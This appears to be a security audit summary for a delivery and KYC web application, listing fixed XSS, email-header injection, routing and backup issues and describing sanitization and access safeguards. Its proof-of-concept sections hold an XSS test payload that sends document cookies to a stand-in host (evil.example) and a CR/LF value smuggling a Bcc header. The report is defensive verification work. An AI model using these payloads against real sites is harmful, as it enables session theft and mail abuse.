# Security Summary

**Reviewed Files**: 36
**Issues Resolved**: 5 (plus 2 external/deployment provisioning items tracked as Needs Follow-Up)

### Issues Resolved
| Area | File | Line | What Was Happening | Impact | Status | How It Was Fixed |
|---|---|---|---|---|---|---|
| Unsanitized HTML Preview | `src/components/modals/EmailNotificationCenterModal.tsx` | 323 | Archived email `htmlContent` was injected directly into the DOM via `dangerouslySetInnerHTML`, allowing stored HTML/script payloads to execute in the application origin. | High | Fixed | Replaced direct DOM injection with a sandboxed `<iframe sandbox="" srcDoc={buildSandboxedEmailPreviewDocument(...)} />` backed by two-pass HTML sanitization and a `default-src 'none'` Content-Security-Policy header (`src/utils/htmlSanitizer.ts`), plus input escaping in `src/services/emailService.ts`. |
| Unsanitized HTML Preview (Admin) | `src/components/views/AdminConsole.tsx` | 4948 | Admin email template preview rendered `previewModalEmail.htmlContent` directly via `dangerouslySetInnerHTML` in the administrator session. | High | Fixed | Switched to a strictly isolated `<iframe sandbox="" srcDoc={buildSandboxedEmailPreviewDocument(...)} />` with zero `allow-scripts` or `allow-same-origin` permissions, and removed two unused legacy password state variables. |
| Email Subject Header Sanitization | `server.ts` | 731 | Plain-text email `subject` and `previewText` headers used `escapeHtml(...)` or minimally trimmed strings rather than stripping CR/LF control characters and avoiding HTML entity artifacts in mail headers. | Medium | Fixed | Added `sanitizeEmailHeaderText` (`server.ts:731`) to strip `\r`, `\n`, ASCII control characters, collapse whitespace, and cap length across welcome, KYC approval, priority mission, and delivery/security notification email headers while reserving `escapeHtml(...)` for `htmlContent`. |
| Firebase Hosting Rewrite & Unified Routing | `firebase.json`, `apphosting.yaml`, `render.yaml`, `server.ts` | 19 | `hosting.rewrites` routed `/api/**` to a nonexistent Cloud Function named `"app"`, while unmatched `/api/*` requests lacked an explicit JSON 404 handler. | High | Fixed | Removed the broken `"function": "app"` rewrite from `firebase.json`, aligned `FIREBASE_DATABASE_ID` and server secrets across `apphosting.yaml` and `render.yaml`, and added an explicit JSON 404 `/api` fallback before `startServer()` in `server.ts`. |
| In-Memory Backup Snapshot | `src/server/systemBackupService.ts`, `server.ts`, `firestore.rules` | 3260 | `/api/system/backup` and `/api/system/restore` stored snapshots in volatile process memory (`testBackupSnapshot`), failing across Cloud Run instances and restarts. | High | Fixed | Replaced with `systemBackupService.ts` persisting snapshots with SHA-256 checksums (`crypto.timingSafeEqual`) in locked Firestore collection `system_backups`, supporting operational exports, IAM `503` fail-closed handling, and `512kb` JSON limits on backup routes. |
| Runtime Secrets & IAM Provisioning | `apphosting.yaml`, `render.yaml` | 17 | Production secrets (`OTP_SECRET_SALT`, `GEMINI_API_KEY`, `EMAIL_ENCRYPTION_SECRET`, `GMAIL_SMTP_USER`/`PASS`, `APP_URL`) and GCP IAM roles must be provisioned manually before launch. | High | Needs Follow-Up | Added `FIREBASE_DATABASE_ID`, `PAYOUT_PROVIDER_MODE`, and secret documentation in `apphosting.yaml`/`render.yaml` plus non-secret `readiness` checks on `/api/security/audit`. Manual GCP Secret Manager provisioning and IAM binding remain required. |
| Live Mobile Money PSP Integration | `src/server/mobileMoneyProvider.ts`, `src/server/p0Security.ts` | 1 | Wallet settlement uses `PAYOUT_PROVIDER_MODE=simulator` (`SIM_LLP_*`) by default until a licensed Mobile Money aggregator (`fedapay`/`kkiapay`/`mtn_momo`/`wave`) is contracted. | Medium | Needs Follow-Up | Added fail-closed `mobileMoneyProvider.ts` (never simulates payments when a live PSP mode is selected without HTTPS/API/HMAC webhook secrets) and wired it into `getP0Security()` and `/api/security/audit`. |

### Safeguards Verified
| Area | File | How It's Protected |
|---|---|---|
| Firebase Auth & Admin RBAC | `firestore.rules`, `storage.rules`, `server.ts` | Enforces verified Firebase ID tokens (`email_verified == true`), server-verified custom claims (`admin`, `super_admin`) plus canonical admin e-mail verification, and default-deny Firestore/Storage rules (with single-read factored update helpers to stay well under CEL expression limits). |
| KYC Document Privacy | `storage.rules`, `server.ts` | Restricts client uploads to verified, non-locked couriers inside `kyc/{userId}/` with MIME/size caps (`< 10 MB`) and serves KYC media to owners/admins via Admin SDK authenticated proxy routes with magic-byte inspection. |
| POD & Chat Media Isolation | `storage.rules`, `server.ts` | Blocks direct non-admin Storage reads/writes on `/pod/` and `/chat/`; Express routes verify order/conversation participation before uploading or streaming files. |
| Server-Side Gemini KYC Analysis | `src/server/kycGeminiAnalysis.ts` | Loads `GEMINI_API_KEY` exclusively from `process.env` on the server, reads only the owner's `kyc/{uid}/` files, enforces per-document concurrency leases, 30s cooldown, daily quota/budget caps, circuit breaker, redacted error logs, and never auto-approves or auto-rejects KYC dossiers. |
| Cryptography & Password Reset OTP | `src/server/p0Security.ts`, `src/server/p1EmailAndConfig.ts`, `server.ts` | Uses HMAC-SHA256 (`crypto.timingSafeEqual`) for reset codes and delivery POD OTPs, transactional brute-force lockouts, single-use reset tokens, TLS-enforced port 587 SMTP timeouts, and HKDF-SHA256 + AES-256-GCM encryption for stored SMTP credentials. |
| Multi-Vendor, Backup & Wallet Isolation | `firestore.rules`, `src/server/p0Security.ts`, `src/server/systemBackupService.ts` | Isolates vendor deliveries, locks `deliveries/*/private/otp` and `system_backups/*` completely from clients, prevents concurrent wallet double-spends via Firestore transactions (`payout_locks`), and validates backup integrity with SHA-256 `timingSafeEqual`. |

---

## PoC Verification

### 1. Stored HTML / Script Execution in Email Preview Modals

#### Summary
| Field | Value |
|---|---|
| Issue Type | Unsanitized HTML Rendering |
| Impact | High |
| Affected File | `src/components/modals/EmailNotificationCenterModal.tsx:323`, `src/components/views/AdminConsole.tsx:4948` |
| Test Scenario | `<div>Bonjour <strong>Koffi</strong></div><script>alert("xss1")</script><img src="x" onerror="fetch('https://evil.example/?c='+document.cookie)" /><svg onload="alert(2)"></svg><a href="javascript:alert(3)">Lien</a><scr<script>ipt>alert(1)</scr</script>ipt>` |

#### How It Was Fixed
Email HTML previews now pass through `buildSandboxedEmailPreviewDocument()` (`src/utils/htmlSanitizer.ts:69`), which performs a two-pass cleanup (`sanitizeEmailPreviewHtml`) removing active tags (`<script>`, `<iframe>`, `<svg>`, `<object>`, `<embed>`, `<form>`, `<style>`, etc.), inline `on*` event attributes, `javascript:`/`vbscript:`/`data:text/html` URLs, and CSS `expression(...)`/`url(javascript:...)`, then wraps the cleaned markup inside a strict `Content-Security-Policy: default-src 'none'; img-src https: data:; style-src 'unsafe-inline'; font-src https: data:;` document rendered inside `<iframe sandbox="" srcDoc={...} />` without `allow-scripts` or `allow-same-origin`. Client-side fallback builders in `src/services/emailService.ts` also escape interpolated user fields via `escapeHtmlText`.

#### Step-by-Step Trace
| Step | What Happens in the Code | Outcome |
|---|---|---|
| 1 | Malicious email payload arrives in `selectedEmail.htmlContent` or `previewModalEmail.htmlContent` and is passed to `buildSandboxedEmailPreviewDocument(...)`. | Input enters sanitization pipeline |
| 2 | `sanitizeEmailPreviewHtml` (`src/utils/htmlSanitizer.ts:30-66`) executes pass 1 and pass 2 regex stripping across nested tags, `onerror`/`onload` attributes, and `javascript:` URIs. | Script tags, event handlers, and dangerous URLs stripped (verified by `src/tests/htmlSanitizer.test.ts` tests 1–2) |
| 3 | `buildSandboxedEmailPreviewDocument` (`src/utils/htmlSanitizer.ts:69-82`) injects `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; ...">` and mounts into `<iframe sandbox="" ... />` (`EmailNotificationCenterModal.tsx:323`, `AdminConsole.tsx:4948`). | Browser blocks all script execution and denies access to parent DOM/cookies/same-origin storage |

#### Conclusion
**Fix Verified** - Verified by `src/tests/htmlSanitizer.test.ts` (4/4 passing tests) and React sandbox isolation (`sandbox=""` without `allow-scripts` or `allow-same-origin`), preventing arbitrary script execution in both user and admin email previews.

### 2. Email Subject Header Control-Character & Entity Artifact Handling

#### Summary
| Field | Value |
|---|---|
| Issue Type | Improper Email Header Sanitization |
| Impact | Medium |
| Affected File | `server.ts:731` |
| Test Scenario | `name = "Koffi\r\nBcc: attacker@evil.example & Sons"` submitted to welcome, KYC-approved, priority mission, or notification email dispatch routes. |

#### How It Was Fixed
Added `sanitizeEmailHeaderText` (`server.ts:731-737`) to strip `\r`, `\n`, ASCII control characters (`\u0000-\u001F`, `\u007F`), normalize whitespace, and enforce maximum length for mail headers (`subject` and `previewText`), while keeping HTML entity encoding (`escapeHtml`) dedicated strictly to `htmlContent`.

#### Step-by-Step Trace
| Step | What Happens in the Code | Outcome |
|---|---|---|
| 1 | Payload containing `\r\nBcc: attacker@evil.example` reaches `handleWelcomeEmailRequest`, `/api/email/kyc-approved`, `/api/email/priority-mission`, or `/api/email/notification`. | Untrusted string enters route handler |
| 2 | Header variables pass through `sanitizeEmailHeaderText(...)` (`server.ts:731-737`) before building `subject` and `previewText`. | `\r`, `\n`, and control bytes replaced with single spaces and truncated to safe header length |
| 3 | Body variables pass through `escapeHtml(...)` (`server.ts:721-729`) prior to building `htmlContent`. | Header injection prevented without corrupting plain-text Subject lines with `&amp;` entities |

#### Conclusion
**Fix Verified** - Email Subject and preview headers strip CR/LF and control characters cleanly while HTML bodies remain entity-escaped.
